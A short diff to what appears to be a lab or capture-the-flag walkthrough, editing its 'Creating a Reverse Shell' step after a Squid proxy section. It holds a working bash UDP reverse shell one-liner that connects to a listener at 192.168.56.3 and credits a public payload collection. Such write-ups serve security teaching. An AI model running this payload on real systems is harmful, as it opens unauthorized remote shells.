@@ -77,6 +77,9 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
 # 6. Creating a Reverse Shell
 
 - Using a shell will allow us to navigate more efficiently. So we can upload a file named test.sh with this script in the body:
+
   ```bash
   sh -i >& /dev/udp/192.168.56.3/1337 0>&1
   ```
+  
+  > This Bash UDP Reverse shell payload can be found on https://github.com/swisskyrepo/PayloadsAllTheThings
